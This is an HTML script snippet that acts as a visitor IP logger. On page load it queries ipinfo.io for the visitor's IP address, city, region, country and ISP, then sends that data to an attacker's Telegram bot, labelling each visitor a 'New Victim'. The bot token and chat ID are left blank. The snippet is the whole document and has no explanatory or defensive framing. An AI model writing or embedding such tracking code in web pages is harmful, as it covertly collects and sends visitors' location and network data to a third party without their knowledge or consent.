<script>
  const botToken = "";
  const chatId = "";

  fetch("https://ipinfo.io/json")
    .then(res => res.json())
    .then(data => {
      const message = `New Victim :
IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country}
ISP: ${data.org || "Unknown"}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
    });

  
</script>
